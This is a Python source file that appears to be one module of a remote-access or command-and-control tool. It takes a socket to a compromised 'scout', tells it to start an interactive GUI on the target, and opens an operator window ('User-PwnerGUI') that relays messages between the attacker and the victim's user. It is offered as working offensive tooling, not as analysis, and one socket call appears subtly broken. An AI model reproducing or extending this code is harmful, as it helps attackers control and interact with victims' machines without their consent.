import library.modules.config as config
import socket,appJar,time,threading
config.main()

def main(scout_id):
    global s,app,old_message
    s = config.scout_database[scout_id][0]
    s.send('interact_user_gui')
    print(s.recv(1024).decode())
    app=appJar.gui('User-PwnerGUI','1000x800')
    app.startPanedFrame("p1")
    app.addLabel("l1", "Your messages")
    app.addScrolledTextArea('msgs')
    app.startPanedFrame("p2")
    app.addLabel("l2", "His messages")
    app.addEmptyMessage('haxmsg')
    app.setMessageWidth('haxmsg',500)
    app.stopPanedFrame()
    app.stopPanedFrame()
    s.sendall('[+]Started GUI on target'.encode())
    old_message=''
    app.registerEvent(updater)
    app.setPollTime('100')
    t=threading.Thread(target=get_data)
    t.start()
    app.go()
def get_data():
    global s,app
    try:
        while True:
            time.sleep(0.1)
            data=s.recv(1024).decode()
            app.queueFunction(app.setMessage, 'haxmsg', data)
    except:
        return
def updater():
    global s,old_message,app
    try:
        this_message=app.getTextArea('msgs')
        if old_message!=this_message:
            old_message=this_message
            s.sendall((this_message).encode())
    except:
        app.stop()